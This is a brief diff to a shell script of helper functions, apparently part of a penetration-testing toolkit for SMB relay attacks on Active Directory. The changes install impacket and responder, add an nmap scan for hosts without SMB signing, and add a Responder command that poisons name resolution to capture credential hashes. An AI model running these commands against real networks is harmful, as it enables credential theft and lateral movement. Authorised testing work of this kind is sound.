@@ -25,15 +25,19 @@ DOC
 
 nb-ad-smb-relay-install() {
     __info "Running $0..."
-    __pkgs crackmapexec
+    __pkgs impacket responder
 }
 
 nb-ad-smb-relay-enum() {
+	nb-vars-set-network
 
+	print -z "nmap --script=smb2-security-mode -p 445 ${__NETWORK}"
 }
 
 nb-ad-smb-relay-responder() {
+    nb-vars-set-iface
 
+	print -z "sudo responder -I ${__IFACE} dwPv"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
